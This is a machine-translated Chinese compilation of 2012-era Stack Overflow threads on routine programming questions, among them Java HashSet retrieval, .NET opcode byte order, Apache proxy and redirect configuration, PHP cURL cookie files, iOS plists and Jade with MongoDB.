调用`ContainsKey()`你的“重建”`MyHashObject`将首先`hashCode()`检查集合，如果重复的哈希码被击中，最后`equals()`检查你的“重建”与原始，在此你可以使用检索原始`get()`

这是 O(1)，但缺点是您可能必须同时覆盖`equals()`和`hashCode()`方法。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2012-08-18T00:11:08.807

听起来您实际上是在尝试将哈希码用作映射中的键（这是 HashSets 在幕后所做的）。你可以明确地做到这一点，通过声明`HashMap<Integer, MyHashObject>`.

HashSet没有`get`，因为通常`get`作为参数提供给方法的对象与返回的对象相同。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2015-02-11T22:08:49.907

如果您知道**Set中元素的顺序，则可以通过将****Set**转换为**Array**来检索它们。像这样的东西：

```
Set mySet = MyStorageObject.getMyStringSet();
Object[] myArr = mySet.toArray();
String value1 = myArr[0].toString();
String value2 = myArr[1].toString(); 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2016-08-27T19:11:13.053

您需要获取对包含在 Set 对象中的对象的引用的想法很常见。它可以通过2种方式存档：

1.  根据需要使用 HashSet，然后：

    ```
    public Object getObjectReference(HashSet<Xobject> set, Xobject obj) {
        if (set.contains(obj)) {
            for (Xobject o : set) {
                if (obj.equals(o))
                    return o;
            }
        }
        return null;
    } 
    ```

要使这种方法起作用，您需要同时覆盖 hashCode() 和 equals(Object o) 方法在最坏的情况下，我们有 O(n)

2.  第二种方法是使用 TreeSet

    ```
    public Object getObjectReference(TreeSet<Xobject> set, Xobject obj) {
        if (set.contains(obj)) {
            return set.floor(obj);
        }
        return null;
    } 
    ```

这种方法使 O(log(n)) 更有效。对于这种方法，您不需要覆盖 hashCode，但您必须实现 Comparable 接口。（定义函数 compareTo(Object o)）。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2015-07-22T03:31:10.623

如果我在我的应用程序中确定该对象没有用于任何列表或哈希数据结构中的搜索，并且没有在其他地方使用 equals 方法，除了在添加时间接用于哈希数据结构的方法。是否建议在 equals 方法中更新集合中的现有对象。请参考以下代码。如果我将这个 bean 添加到 HashSet，我可以对键（id）上的匹配对象进行组聚合。通过这种方式，我也可以实现 sum、max、min 等聚合函数。如果不建议，请随时与我分享您的想法。

```
public class MyBean {

    String id,
           name;
    double amountSpent;

    @Override
    public int hashCode() {
        return id.hashCode();
    }

    @Override
    public boolean equals(Object obj) {
        if(obj!=null && obj instanceof MyBean ) {
            MyBean tmpObj = (MyBean) obj;
            if(tmpObj.id!=null && tmpObj.id.equals(this.id)) {
                tmpObj.amountSpent += this.amountSpent;
                return true;
            }
        }
        return false;
    }
} 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2018-02-04T06:26:38.467

首先将您的集合转换为数组。然后，按数组的索引获取项目。

```
Set uniqueItem = new HashSet() ;
uniqueItem.add("0");
uniqueItem.add("1");
uniqueItem.add("0");

Object[] arrayItem = uniqueItem.toArray(); 
for(int i = 0; i < uniqueItem.size();i++){
    System.out.println("Item "+i+" "+arrayItem[i].toString());
} 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2019-09-13T12:20:20.553

最简单的方法之一是转换为数组：

```
for(int i = 0; i < set.size(); i++) {
    System.out.println(set.toArray()[i]);
} 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2016-03-06T23:08:34.657

如果您可以`List`用作数据结构来存储数据，而不是`Map`将结果存储在 Map 的值中，则可以使用以下代码段并将结果存储在同一个对象中。

这是一个**节点**类：

```
private class Node {
    public int row, col, distance;

    public Node(int row, int col, int distance) {
        this.row = row;
        this.col = col;
        this.distance = distance;
    }

    public boolean equals(Object o) {
        return (o instanceof Node &&
                row == ((Node) o).row &&
                col == ((Node) o).col);
    }
} 
```

如果您将结果存储在**距离**变量中，并且根据它们的坐标检查列表中的项目，您可以使用以下方法在**lastIndexOf**方法的帮助下将距离更改为新的距离，只要您只需要存储一个元素对于每个数据：

```
 List<Node> nodeList;
    nodeList = new ArrayList<>(Arrays.asList(new Node(1, 2, 1), new Node(3, 4, 5)));
    Node tempNode = new Node(1, 2, 10);
    if(nodeList.contains(tempNode))
        nodeList.get(nodeList.lastIndexOf(tempNode)).distance += tempNode.distance; 
```

它基本上是重新实现`Set`可以访问和更改哪些项目。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2022-02-01T06:10:03.287

set.stream().findFirst() 呢？

# .net - 为什么 `OpCode.Value` 有“错误”的字节序？

> ID：12014642
> 
> 赞同：7
> 
> 时间：2012-08-18T00:07:52.757
> 
> 标签：.net, endianness, cil, reflection.emit, opcode

**事实：**

1.  CIL 指令[`rethrow`](http://msdn.microsoft.com/en-us/library/system.reflection.emit.opcodes.rethrow.aspx "System.Reflection.Emit.OpCodes.Rethrow 的 MSDN 参考页")操作码的正确编码是两字节序列`FE 1A`。

2.  [`OpCodes.Rethrow.Value`](http://msdn.microsoft.com/en-us/library/system.reflection.emit.opcode.value.aspx "System.Reflection.Emit.OpCode.Value 的 MSDN 参考页")（具有 type `short`）`0xFE1A`在我的 little-endian 机器上具有价值。

3.  [`BitConverter`](http://msdn.microsoft.com/en-us/library/system.bitconverter.aspx "System.BitConverter 的 MSDN 参考页")在转换到/从字节序列时尊重机器的字节顺序。

4.  在我的 little-endian 机器上，`BitConverter.GetBytes(OpCodes.Rethrow.Value)`结果为 byte sequence `1A FE`。

这意味着，`OpCode.Value`在 little-endian 机器上使用序列化 a`BitConverter`不会为操作码生成正确的编码；字节顺序颠倒了。

**问题：**

*   是[`OpCode.Value`](http://msdn.microsoft.com/en-us/library/system.reflection.emit.opcode.value.aspx "System.Reflection.Emit.OpCode.Value 的 MSDN 参考页")记录的字节顺序（如果是，在哪里？），还是“实现细节”？

*   上面的步骤 4 在大端机器上是否也会导致错误的字节顺序？也就是说，会`OpCodes.Rethrow.Value`在`0x1AFE`大端机器上吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-18T08:03:43.610

参考源中的 Value 属性如下所示：

```
public short Value
{
    get
    {
        if (m_size == 2)
            return (short) (m_s1 << 8 | m_s2);
        return (short) m_s2;
    }
} 
```

当然，这看起来完全正常，m_s2 始终是最低有效字节。查看 ILGenerator：

```
 internal void InternalEmit(OpCode opcode)
    {
        if (opcode.m_size == 1)
        {
            m_ILStream[m_length++] = opcode.m_s2;
        }
        else
        {
            m_ILStream[m_length++] = opcode.m_s1;
            m_ILStream[m_length++] = opcode.m_s2;
        }

        UpdateStackSize(opcode, opcode.StackChange());

    } 
```

这是您所期望的，首先发出 0xfe 字节。

所以框架代码小心地避免依赖字节序。CIL 没有字节序依赖性，也没有可变长度数据。真适用于文本文件、utf-8 编码、x86 核心机器码指令。一个 CIL。因此，如果您将可变长度数据转换为*单个*值，就像 Value 属性 getter 所做的那样，那么该代码不可避免地*会*从非字节序数据转换为字节序数据。这不可避免地让世界上的一半人感到不安，因为他们认为这是错误的方式。以及 100% 遇到它的所有程序员。

可能最好的方法是像框架一样执行此操作，并使用您自己的 Opcode 类型版本尽快恢复 m_s1 和 m_s2。易于操作：

```
foo.m_s1 = opc.Value >> 8;
foo.m_s2 = opc.Value & 0xff;
foo.m_size = opc.Size; 
```

没有字节序依赖性。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-18T10:06:19.910

我得出的结论是，基于`OpCode.Value`属性序列化操作码表示，即：

```
OpCode someOpCode = …;
byte[] someOpCodeEncoding = BitConverter.GetBytes(someOpCode.Value); 
```

是一个坏主意，但不是因为使用[`BitConverter.GetBytes(short)`](http://msdn.microsoft.com/en-us/library/fk3sts66.aspx "MSDN 参考页")，其行为有据可查。罪魁祸首是`OpCode.Value`财产，[其文件](http://msdn.microsoft.com/en-us/library/system.reflection.emit.opcode.value.aspx "System.Reflection.Emit.OpCode.Value 的 MSDN 参考页")在两个方面含糊不清：

1.  它声明此属性包含“立即操作数的值”，它可能会或可能不会引用操作码的编码；该术语没有出现在 CLI 规范中的任何地方。

2.  即使我们假设它*确实*包含操作码的编码，文档也没有说明字节顺序。`byte[]`（在和之间转换时字节顺序起作用`short`。）

为什么我的论点基于 MSDN 文档，而不是 CLI 标准？因为`System.Reflection.Emit`它不是 CLI 标准定义的反射库的一部分。出于这个原因，我认为可以相当肯定地说，[这个命名空间的 MSDN 参考文档](http://msdn.microsoft.com/en-us/library/system.reflection.emit.aspx "System.Reflection.Emit 的 MSDN 参考页")与官方规范一样接近。（但与@Hans Passant 的回答不同，我不会更进一步并声称参考源无论如何都是规范。）

**结论：**

有两种方法可以输出给定`OpCode`对象的操作码编码：

*   保持`System.Reflection.Emit`功能和使用`ILGenerator.Emit(someOpCode)`。在某些情况下，这可能过于严格。

*   在操作码编码（即`byte[]`序列）和各种`OpCode`对象之间创建您自己的映射。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-18T12:26:07.440

尝试：

```
var yourStream = MemoryStream();
var writer = new System.IO.BinaryWriter(yourStream);
writer.Write(OpCodes.Rethrow.Value); 
```

您无需担心字节顺序，因为 BinaryWriter（或阅读器）将为您处理实现细节。我怀疑你得到“错误”字节顺序的原因是你在 OpCode 值已经被解码为小端时应用 BitConverter，并且再次应用 BitConverter.GetShort() 调用将反转字节订单，给你“错误”的结果。

# apache - mod_autoindex 隐藏用于 mod_proxy 的目录

> ID：12014650
> 
> 赞同：2
> 
> 时间：2012-08-18T00:09:33.627
> 
> 标签：apache, proxy, indexing, mod-proxy, mod-autoindex

我确实使用 mod_proxy 设置了两个代理。但是，当我使用 mod_autoindex 列出根目录中的所有目录时，它不会显示与代理同名的其他存在和空的虚拟目录，即使我使用 ShowForbidden 也不显示。

```
LoadModule proxy_module modules/mod_proxy.so
LoadModule proxy_http_module modules/mod_proxy_http.so

ProxyPass /jenkins/ http://localhost:8080/jenkins/
ProxyPassReverse /jenkins/ http://localhost:8080/jenkins/

ProxyPass /redmine/ http://localhost:81/redmine/
ProxyPassReverse /redmine/ http://localhost:81/redmine/

<Directory />
    AllowOverride All
    Order Allow,Deny
    Allow from All
    Options -ExecCGI +FollowSymLinks +IncludesNOEXEC +Indexes +MultiViews -SymLinksIfOwnerMatch
    IndexOptions Charset=UTF-8 Type=text/html DescriptionWidth=* FancyIndexing FoldersFirst HTMLTable IconsAreLinks IgnoreCase NameWidth=* ShowForbidden VersionSort XHTML
</Directory> 
```

有没有办法强制 mod_autoindex 显示这些目录，以及代理的链接？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-21T08:50:45.317

自动索引无法向您显示由反向代理或别名或类似内容定义的 URI。请求的 URI 通过 URI 到文件的映射管道，应用了一堆模块，最后你最终得到一个带有（希望）内容的响应。Mod_autoindex 仅查看在 URI 到文件处理管道末尾的目录中的物理文件，因此您使用别名或定义为反向代理的任何内容都不会显示在该自动索引列表中，因为它们不是文件系统上的物理文件/目录。

我认为没有一种轻松的方法可以让自动索引目录列表也包含别名或反向代理。更痛苦的方法是编写自定义脚本来生成索引列表并包含您的自定义别名和反向代理。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-20T19:11:23.157

好吧，我管理的最简单的解决方案是创建一个 /jenkins_/ 目录并使用 mod_rewrite 将其重定向到 /jenkins/。

```
RewriteEngine on
RewriteBase /jenkins_/
RewriteRule ^(.*)$ /jenkins/$1 [R] 
```

这不是我想要的，但很接近。

# ios - 如何找到我的 plist 的文件路径？

> ID：12014651
> 
> 赞同：0
> 
> 时间：2012-08-18T00:09:47.737
> 
> 标签：ios, xcode, uitableview, plist

我正在尝试将 plist 加载到 UITableView 中。我是使用 pLists 和 tableViews 的新手，但我知道我需要使用这些方面的东西。我的问题是虽然“filePath”在哪里，但我实际上不知道如何放入我的 pList？

```
list = [NSArray arrayWithContentsOfFile:filePath]; 
```

除了获取文件路径之外，任何其他有关如何执行此操作的代码建议将不胜感激。比如我需要在我的 .h 文件中放任何东西吗？谢谢。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-08-18T00:36:33.860

假设您已经在项目中添加了 .plist，我创建了一个可以添加到项目中的类，该类将获取信息并将信息保存到给定的 .plist。它是一个正常工作的单例，所以你可以从任何地方调用它。

首先，创建一个名为“GetAndSaveData”的新 NSObject 文件，然后将以下代码发布到 .h 中：

```
@interface GetAndSaveData : NSObject{
    NSMutableDictionary *allData;
    NSString *path;
}

+(GetAndSaveData *)sharedGetAndSave;
-(NSMutableArray *)arrayForKey:(NSString *)dataList;

-(void)setData:(NSMutableArray *)array ForKey:(NSString *)dataList;

@end 
```

并将以下代码放入.m：

```
static GetAndSaveData *sharedGetAndSave;

@implementation GetAndSaveData

-(id)init{

    self = [super init];

    NSError *error;
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES); //1
    NSString *documentsDirectory = [paths objectAtIndex:0]; 
    path = [documentsDirectory stringByAppendingPathComponent:@"data.plist"]; 

   if (![fileManager fileExistsAtPath: path]) 
    {
    NSString *bundle = [[NSBundle mainBundle] pathForResource:@"data" ofType:@"plist"]; 

    [fileManager copyItemAtPath:bundle toPath: path error:&error]; 
    }

    allData = [[NSMutableDictionary alloc] initWithContentsOfFile: path]; 

    return self;
}

-(NSMutableArray *)arrayForKey:(NSString *)dataList{
    NSMutableArray *array = [allData objectForKey:dataList];

    return array;
}

-(void)setData:(NSMutableArray *)array ForKey:(NSString *)dataList{

    [allData setObject:array forKey:dataList];
    [allData writeToFile:path atomically:YES];

    if(![allData writeToFile:path atomically:YES])
    {
        NSLog(@".plist writing was unsuccessful");

    }

}

+(GetAndSaveData *)sharedGetAndSave{
    if (!sharedGetAndSave) {
        sharedGetAndSave = [[GetAndSaveData alloc] init];
    }
    return sharedGetAndSave;
}

+(id)allocWithZone:(NSZone *)zone{
    if (!sharedGetAndSave) {
        sharedGetAndSave = [super allocWithZone:zone];
        return sharedGetAndSave;
    } else {
        return nil;
    }
}

-(id)copyWithZone:(NSZone *)zone{
    return self;
}
@end 
```

您可以更改函数以获取和保存不同类型的数据。您可以通过导入 .h 文件并执行以下操作在视图控制器中使用它：

```
myMutableArray = [[GetAndSaveData sharedGetAndSave]arrayForKey:myKey]; 
```

# iphone - 如何调试 if(sqlite3_step(selectstmt) == SQLITE_DONE) 的结果

> ID：12014655
> 
> 赞同：0
> 
> 时间：2012-08-18T00:10:14.627
> 
> 标签：iphone, objective-c, ios, sqlite

我只是想不通..我似乎有人通过 NSLog 进行调试...没有集成 IDE 的方法来检查这个吗？喜欢监视列表

这段代码返回错误，我只想看看那里发生了什么..

```
if(sqlite3_step(selectstmt) == SQLITE_DONE) 
```

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T00:33:11.697

还没完成，问题就来了。它要么遇到错误，要么有更多行。如果你想在调试器中跟踪它，你需要一些东西来实际*观察*。例如：

```
int result = SQLITE_DONE;
if( (result = sqlite3_step(select stmt)) == SQLITE_DONE ) /* do stuff */ 
```

现在您实际上可以在此处中断，或观察`result`变量（尽管考虑到它的自动作用域，观察它并不是非常有用）。此外，对于任何调试器，您的代码被压缩到一行中的次数越多，调试器就越难以合理地让您知道发生了什么。如果您对代码进行了更多分解，那么在哪里停止调试器就很明显了：

```
int result = sqlite_step(selectstmt);
if( result == SQLITE_DONE ) /* do stuff */ // <- now it's easy to see what's going on in a debugger 
```

# ruby - Ruby on Rails - 外部 API 模型中的会话

> ID：12014661
> 
> 赞同：1
> 
> 时间：2012-08-18T00:11:02.533
> 
> 标签：ruby, api, session, model, external

我有一个没有模型或任何数据库连接的应用程序。

我在 ApplicationController 中定义了一个名为“api_call”的方法，它执行应用程序内的所有 api 调用。此方法使用 ruby​​ 会话来存储有关用户的信息，例如身份验证信息、访问令牌信息和用户信息。在会话中，我存储了一个身份验证哈希，用于在用户登录时发送到 api 以确保安全。

两件事情：

1.  我想将所有 api 调用（api_call 方法）放在模型中（不使用数据库或验证），但问题是我没有访问会话。
2.  如果我使用模块，模型中的模块也无权访问会话。
3.  如果我在不使用 ActiveRecord 的情况下创建模型类，我应该使用类方法而不是对象方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T02:18:28.930

将“身份验证哈希”传递给 API 模型的构造函数怎么样？

```
class Api
  def initialize auth
    @auth = auth
  end
end

class FooController < ApplicationController
  def index
    api = Api.new session[:auth]
  end
end 
```

另外，如果你还没有看到[Pratik Naik 的文章](http://m.onkey.org/how-to-access-session-cookies-params-request-in-model)，那很有趣。

# php - PHP CURL 创建和使用唯一命名的 cookie 文件

> ID：12014666
> 
> 赞同：2
> 
> 时间：2012-08-18T00:11:32.553
> 
> 标签：php, curl

我有一个用于登录远程站点的 php 脚本，它运行良好。然而，它似乎只在指定的 cookie 文件被命名时才有效`cookie.txt`

我想要的是每个使用这个脚本的人都有一个单独的 cookie 文件。因此，如果 machineA 上的一个人在 19 日使用它，他们的 cookie 将位于类似`/tmp/19/someNameCookie.txt`machineB 的位置`/tmp/19/someOtherNamedCookie.txt`，如果 machineC 在 20 日使用它，他们将拥有cookie `/tmp/20/someNamedCookie.txt`。

有很多方法可以生成唯一命名的文件，但这里的关键是让它们工作。我在 php 知识方面还很年轻，而且对 curl 完全陌生。

附带说明一下，我也没有成功使用`CURLOPT_FOLLOWLOCATION`登录来获取新页面。

谢谢。

* * *

这是一个代码。从另一个来源得到这个。

```
$username=urlencode($usr); 
$password=urlencode($pass); 
$url="http://domain.com/"; 
$cookie="cookie.txt"; 

$ch = curl_init(); 
curl_setopt ($ch, CURLOPT_URL, $url); 
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"); 
curl_setopt ($ch, CURLOPT_TIMEOUT, 60); 
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch, CURLOPT_HEADER, 1);
curl_setopt ($ch, CURLOPT_COOKIESESSION, TRUE);
curl_setopt ($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt ($ch, CURLOPT_COOKIEFILE, $cookie); // have tried with just the jar, and just the file and both 
curl_setopt ($ch, CURLOPT_REFERER, $url); 

curl_setopt ($ch, CURLOPT_POSTFIELDS, $postdata); 
curl_setopt ($ch, CURLOPT_POST, 1); 
$result = curl_exec ($ch);

echo $result;  
curl_close($ch); 
```

这是我要检查登录是否成功后调用的代码

```
$ch2 = curl_init();
//curl_setopt ($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt ($ch2, CURLOPT_COOKIEFILE, $cookie);
curl_setopt ($ch2, CURLOPT_URL, "http://domain.com/");

$r = curl_exec($ch2);
echo $r;
curl_close($ch2); 
```

据我了解，如果 cookie 文件不存在，curl 应该创建它。我也尝试过手动创建其他文件并使用 fopen 通过脚本创建其他文件，但仅在我使用 cookie.txt 时才有效，现在所有文件都保存到 public_html 以供测试。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-18T00:15:18.840

设置`Cookie Jar`

```
<?php
    $machine = 'PC_A'; // here it's your problem how you define each machine
    $cookie_file = "/tmp/".date('d')."/".$machine."_cookie.txt";
    // and set the cURL cookie jar and file

    if (!file_exists($cookie_file) || !is_writable($cookie_file)){
            echo 'Cookie file missing or not writable.';
            die;
    }

    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-18T00:14:58.400

例如使用 session_id() 作为 cookie 文件名，它对于连接到您的应用程序的每台机器都是唯一的，并且在过期之前它仍然相同

# ajax - Ajax 绑定剑道 asp.net Mvc 3 仅显示 json

> ID：12014667
> 
> 赞同：0
> 
> 时间：2012-08-18T00:11:46.373
> 
> 标签：ajax, json, asp.net-mvc-3, kendo-ui

json 结果只是显示在屏幕上，而不是填充网格。

```
public ActionResult BulkEdit([DataSourceRequest]DataSourceRequest request)
{        
    var NewAssets = db.TurnaroundDumps;
    DataSourceResult result = NewAssets.ToDataSourceResult(request)
    return Json(result, JsonRequestBehavior.AllowGet);
} 
```

 然后在我看来：

```
@(Html.Kendo().Grid<PcInventory_v1_1.Models.TurnaroundDump>()
.Name("Grid")
.Columns(columns =>
{
    columns.Bound(p => p.AssetTag);
    columns.Bound(p => p.SerialNumber);
    columns.Bound(p => p.DeptId);
    columns.Bound(p => p.Location);
})
    .DataSource(dataSource => dataSource
        .Ajax() // Specify that the data source is of ajax type
        .Read(read => read.Action("BulkEdit", "Assets")) 
        // Specify the action method and controller name
    ).Pageable()
) 
```

出了什么问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-19T16:41:21.977

我忘了返回视图。

这是答案：

```
 public ActionResult BulkEdit()
    {
        return View();
    }

    [HttpPost]
    public ActionResult BulkEdit([DataSourceRequest]DataSourceRequest request)
    {
        var emp = db.TurnaroundDumps;

        DataSourceResult result = emp.ToDataSourceResult(request);

        return Json(result, JsonRequestBehavior.AllowGet);
    } 
```

# php - 使用服务器到服务器 API 调用替换使用 $.ajax() 和 JSONP 的 API 调用

> ID：12014672
> 
> 赞同：1
> 
> 时间：2012-08-18T00:12:58.513
> 
> 标签：php, javascript, ajax, json, etsy

我有一个javascript应用程序调用一个看起来像这样的ajax函数

```
$.ajax({ url: apiURL, dataType: 'jsonp', success: function(data) {
    if (data.ok) {
        //do things
}}}); 
```

我试图访问的 ajax url 是通过 etsyapi 一切正常且花花公子，直到我尝试使用 adblock 访问 chrome 中的应用程序。它使 ajax 调用完全失败，返回一个错误，并带有 Failed to load resource-"theActualURL" 消息。

我不知道如何在 javascript 中解决这个问题，并被告知我需要进行 php 调用才能使其正常工作。

不幸的是，我不知道关于 php-ive 的第一件事，甚至试图理解它的基本结构，而且我无法在 javascript 中找到任何解决方法，所以我认为它必须用 php 来完成。

有没有最简单的方法可以使用动态 url（从 javascript 传递到 php 页面）调用 php 中的 ajax 函数并将数组传递回 javascript 以进行操作？

我已经用 php-

```
<?php
    $json = array();

    ????????????????????????

    $jsonstring = json_encode($json);
    echo $jsonstring; 
?> 
```

但不明白如何从 javascript 访问动态 url。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T00:21:15.753

~~如果它真的使用 jsonp 你不应该需要 php。将您的替换`$.ajax...`为：~~

 ~~```
var newScript = document.createElement('script');
newScript.src = apiURL;
document.head.appendChild(newScript); 
```~~  ~~忽略以上，我对 jQuery 已经过时了。即便如此，如果 API 端点确实使用 jsonp 响应，则您不应该需要 php。如果您遇到错误，这听起来像是 url 错误/错误。您是否尝试过`apiURL`将其放在浏览器的地址栏中简单地打开？

jsonp 是针对跨域 ajax 限制的一种解决方法，它将返回的数据包装在 javascript 函数调用中。这允许您将其加载到脚本标记中，并且在执行脚本时将数据作为参数运行该函数。~~

# java - HttpGet.abort() / HttpPost.abort() 并不总是立即中止

> ID：12014673
> 
> 赞同：5
> 
> 时间：2012-08-18T00:13:13.273
> 
> 标签：java, apache-httpcomponents

我正在使用 Apache HttpComponents 4.2.1，但无法让 HttpGet.abort() 和 HttpPost.abort() 始终立即中止。它大部分时间都可以工作，但偶尔连接会阻塞，直到超时。我注意到这只发生在我明确设置超时值时。

这是我的测试代码：

```
public static void main(String[] args) throws Exception {
    for (int i = 0; i < 10; i++) {
        testAbort();
    }
}

public static void testAbort() throws Exception {
    String urlString = "http://slow.website.com";

    final HttpGet httpGet = new HttpGet(urlString);

    Runnable runnable = new Runnable() {
        public void run() {
            try {
                HttpClient httpClient = new DefaultHttpClient();

                HttpParams httpParams = httpClient.getParams();

                HttpConnectionParams.setConnectionTimeout(httpParams, 10000); // issue doesn't occur if I comment this line

                httpClient.execute(httpGet);
            } 
            catch (Exception e) {
                System.out.println(e.getMessage());
            }
        }
    };

    Thread t = new Thread(runnable);

    t.start();

    Thread.sleep(100);

    httpGet.abort();
} 
```

这是我得到的输出示例：

```
Request already aborted
Request already aborted
Request already aborted
Socket closed
Request already aborted
Connection has been shut down
Socket closed
Socket closed
Connect to slow.website.com:80 timed out
Connect to www.website.com:80 timed out 
```

您可能需要增加迭代次数或调整 Thread.sleep() 值才能看到问题发生。

根据 HttpComponent 文档，“当一个 HTTP 请求被中止时，它在 I/O 操作中被阻塞的执行线程通过抛出一个 InterruptedIOException 来保证解除阻塞”（[链接](http://hc.apache.org/httpcomponents-client-ga/tutorial/html/fundamentals.html#d4e285)）

我正在运行 Mac OS X 10.8（Java 版本 1.6.0_29）。

任何想法可能是什么问题？

# android - OpenGL 运行时异常问题

> ID：12014683
> 
> 赞同：1
> 
> 时间：2012-08-18T00:14:54.550
> 
> 标签：android, opengl-es

> **可能重复：**
> [java.lang.RuntimeException：eglSwapBuffers 失败：EGL_SUCCESS 报告](https://stackoverflow.com/questions/10871261/java-lang-runtimeexception-eglswapbuffers-failed-egl-success-report)

我从 Google Play Developer Console 获得以下运行时异常报告：

```
java.lang.RuntimeException: eglSwapBuffers failed: EGL_SUCCESS
at android.opengl.GLSurfaceView$EglHelper.throwEglException(GLSurfaceView.java:1085)
at android.opengl.GLSurfaceView$EglHelper.swap(GLSurfaceView.java:1043)
at android.opengl.GLSurfaceView$GLThread.guardedRun(GLSurfaceView.java:1369)
at android.opengl.GLSurfaceView$GLThread.run(GLSurfaceView.java:1123) 
```

我在开发游戏时从来没有遇到过这样的异常。这可能是什么原因？我该如何解决这个问题？每天都有人遇到这个问题，这真的很令人沮丧。

# javascript - 在jade模板中显示mongodb集合

> ID：12014685
> 
> 赞同：6
> 
> 时间：2012-08-18T00:15:02.003
> 
> 标签：javascript, node.js, mongodb, express, pug

我是 node.js 和 mongodb 的新手。我设置了一个名为“文章”的 mongodb 集合。我想在一个玉模板中显示这个集合的所有文章。我使用了这段代码：

server.js：

```
articles: db.article.find() 
```

index.jade:

```
-for article in articles
      .row
        .twelve.columns
          .panel
            li= article.text 
```

玉真的很基础，但会改变。事实上，当我运行这段代码时，jade 模板中的列表是空的，什么也没有显示。看起来变量“文章”是空的。

有谁知道我怎样才能让它工作？

谢谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-18T04:51:46.107

`.find()`是异步的。您正在同步使用它。

```
function(req, res, next) {
  db.articles.find().toArray(function(err, articles) {
    res.render('page', {
      articles: articles
    }
  })
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-18T00:16:56.970

尝试：

```
- console.log(articles) 
```

在您的模板中确定数组是否为空！

# java - 非常简单的最终修饰符和运行方法问题

> ID：12014687
> 
> 赞同：0
> 
> 时间：2012-08-18T00:15:17.530
> 
> 标签：java

我对修饰符“final”和 run() 方法中使用的 var 有一个简单的问题。这是我拥有的一些代码，但其他代码不起作用。我想它不能添加到 firstTime 变量中，我不确定这是因为你不能使用 final 修饰符来做到这一点，或者 java 只是讨厌我：/

```
final long firstTime = System.currentTimeMillis();

WorldTasksManager.schedule(new WorldTask() {
@Override
public void run() {
    if (System.currentTimeMillis() >= firstTime) {
        stop();
    } else {
    firstTime += 5;
    }
} 
```

如果你们知道是什么原因造成的或者我该如何解决这个问题，请帮忙。

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-18T00:16:57.267

最终变量无法修改。那就是（本质上）final的定义。

你不能改变引用，但你可以改变对象。但是，在`long`您在这里遇到的情况下，`long`会创建一个 new 并将其分配给 的值`firstTime`，它试图更改引用，因此是非法的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-18T00:17:31.907

最终变量只能在构造函数中或在声明时通过初始化程序分配。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-18T01:38:18.167

此 SO Q&A 解释了您在删除`final`修饰符时遇到的编译错误：

*   [为什么在匿名类中只能访问最终变量？](https://stackoverflow.com/questions/4732544/why-are-only-final-variables-accessible-in-anonymous-class)

在您的示例中，`firstTime`变量`run()`看到的实际上是封闭类中变量的*副本。*需要保持只有一个变量的错觉`firstTime`......`final`

您将声明移动`firstTime`到`run()`方法中的解决方案很好，但它确实改变了行为。该变量现在设置为任务开始运行的时间，之前它设置为任务计划的时间。

最后，如果您真的希望该`run()`方法能够更新`firstTime`封闭范围内的变量，您将需要以其他方式执行此操作。这种最简单的方法是创建`firstTime`一个实例变量，而不是局部变量。然后您可以删除`final`并且该`run()`方法可以直接更新变量。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-18T06:57:09.967

做喜欢

```
WorldTasksManager.schedule(new WorldTask() {
@Override
public void run() {
    long firstTime = System.currentTimeMillis();
    if (System.currentTimeMillis() >= firstTime) {
        stop();
    } else {
    firstTime += 5;
    }
} 
```

# apache - Apache2 重定向

> ID：12014689
> 
> 赞同：1
> 
> 时间：2012-08-18T00:15:54.950
> 
> 标签：apache, ubuntu, http-status-code-301

我是 apache2 配置的新手，据我所知，服务器设置是正确的，并且在 mydomain.com 上运行良好

问题是，即使我明确键入 url www.mydomain.com，我也会得到从 apache 到 mydomain.com 的 301 重定向。我尝试重写规则只是以无限循环结束。

我们实际上想做反向 - mydomain.com 应该重定向到 www.mydomain.com 但如上所述，我得到无限重定向循环，直到浏览器放弃。

我已经搜索了配置，但找不到任何提及 mydomain.com 的内容，因此认为存在一些未正确配置的外部配置（DNS 查找？）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T00:24:05.167

确保检查 DNS 服务器以确认您有 www.mydomain.com 的 CNAME

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-07-04T23:50:37.017

如果这是用于本地 PC（测试和开发），则需要在 windows 中编辑主机文件或在 linux 中编辑主机。

